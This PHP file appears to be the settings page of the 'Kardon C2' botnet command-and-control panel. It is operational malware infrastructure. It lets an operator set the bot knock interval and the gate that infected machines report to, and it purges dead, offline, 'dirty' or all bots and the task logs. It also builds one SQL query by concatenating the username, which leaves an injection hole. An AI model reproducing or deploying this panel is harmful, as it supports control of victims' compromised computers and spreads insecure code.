<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';  
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);  
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    </style>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--grey-100 mdl-color-text--grey-600">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Settings</span>
          <div class="mdl-layout-spacer"></div>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--blue-grey-900 mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--blue-grey-800">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--grey-100">
        <div class="mdl-grid demo-content">
        <?php
						if ($userperms != "admin")
						{
							echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>You do not have permission to view this page.</h6></center></div>';
							die();
						}
						if (isset($_GET['clear']))
						{
							$clear = strtolower($_GET['clear']);
							$safe = array("dead", "offline", "dirty", "all", "tasklogs");
							if (in_array($clear, $safe))
							{
								if ($clear == "dead")
								{
									$d = $odb->prepare("DELETE FROM bots WHERE lastresponce + :d < UNIX_TIMESTAMP()");
									$d->execute(array(":d" => $deadi));
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dead bots from table', UNIX_TIMESTAMP())");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "offline"){
									$o = $odb->prepare("DELETE FROM bots WHERE (lastresponce + :o < UNIX_TIMESTAMP()) AND (lastresponce + :d > UNIX_TIMESTAMP())");
									$o->execute(array(":o" => $knock + 120, ":d" => $deadi));
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared offline bots from table', UNIX_TIMESTAMP())");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "dirty"){
									$odb->query("DELETE FROM bots WHERE mark = '2'");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared dirty bots from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else if ($clear == "tasklogs"){
									$odb->query("TRUNCATE tasks_completed");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared task execution logs from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}else{
									$odb->query("TRUNCATE bots");
									$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Cleared all bots from table', UNIX_TIMESTAMP()");
									$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								}
								echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Successfully cleared entries. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}else{
								echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Invalid clear option. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}
						}
						if (isset($_POST['updateSettings']))
						{
							$newknock = $_POST['knock'];
							$newdead = $_POST['dead'];
							$newgate = $_POST['gstatus'];
							if (!ctype_digit($newknock) || !ctype_digit($newdead) || !ctype_digit($newgate))
							{
								echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>One of the parameters was not a digit. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=settings">';
							}else{
								$up = $odb->prepare("UPDATE settings SET knock = :k, dead = :d, gate_status = :g LIMIT 1");
								$up->execute(array(":k" => $newknock, ":d" => $newdead, ":g" => $newgate));
								$i = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, 'Updated panel settings', UNIX_TIMESTAMP())");
								$i->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR']));
								echo '<div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--12-col"><center><h6>Settings successfully updated. Reloading...</h6></center></div><meta http-equiv="refresh" content="2;url=?p=settings">';
								
							}
						}
					?>
          <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--6-col">
          <center>
            <h6>Main</h6>
            <form action="" method="POST" class="col-lg-6">
              <label>Knock Interval</label>
              <div class="input-group">
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="text" name="knock" class="form-control" value="<?php echo $odb->query("SELECT knock FROM settings LIMIT 1")->fetchColumn(0); ?>"></div>
                <span class="input-group-addon">Minutes</span>
              </div>
              <br>
              <label>Dead after</label>
              <div class="input-group">
                <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label"><input class="mdl-textfield__input" type="text" name="dead" class="form-control" value="<?php echo $odb->query("SELECT dead FROM settings LIMIT 1")->fetchColumn(0); ?>"></div>
                <span class="input-group-addon">Days</span>
              </div>
              <br>
              <label>Gate Status</label>
              <select name="gstatus" class="form-control">
                <?php
                $val = $odb->query("SELECT gate_status FROM settings LIMIT 1")->fetchColumn(0);
                if ($val == "1")
                {
                  echo '<option value="1" selected>Enabled</option><option value="2">Disabled</option>';
                }else{
                  echo '<option value="1">Enabled</option><option value="2" selected>Disabled</option>';
                }
                ?>
              </select>
              <br><br>
              <input type="submit" name="updateSettings" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--green-500" value="Update Settings">
            </form>
          </center>
          </div>
          <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--6-col">
            <center>
              <h6>Database</h6>
              <p>The database is currently using <b><?php echo $odb->query("SELECT ROUND(SUM(data_length + index_length) / 1024, 2) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0); ?> KB</b> of space, with <b><?php echo number_format($odb->query("SELECT SUM(table_rows) FROM information_schema.TABLES WHERE table_schema = (SELECT DATABASE())")->fetchColumn(0)); ?></b> rows in total.</p>
              <hr>
              <h6>Optimization</h6>
              <a href="?p=settings&clear=dead" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-500">Clear Dead Bots</a>
              <a href="?p=settings&clear=offline"class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-500">Clear Offline Bots</a><br><br>
              <a href="?p=settings&clear=dirty" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-500">Clear Dirty Bots</a>
              <a onclick="ask('1')" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-500">Clear All Bots</a><br><br>
              <a onclick="ask('2')" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-color--red-500">Clear Task Execution Logs</a><br><br>
            </center>
          </div>
        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
    <script type="text/javascript">
		function ask(id)
		{
			if (id == "1")
			{
				if (confirm("WARNING: You are about to clear all of the bots from your database! Are you sure you want to do this?"))
				{
					setTimeout('window.location = "?p=settings&clear=all"', 1000);
				}
			}else{
				if (confirm("WARNING: You are about to clear all task execution logs from your database! This could lead to inaccurate numbers on the Tasks page. Are you sure you want to do this?"))
				{
					setTimeout('window.location = "?p=settings&clear=tasklogs"', 1000);
				}
			}
		}
	</script>
  </body>
</html>
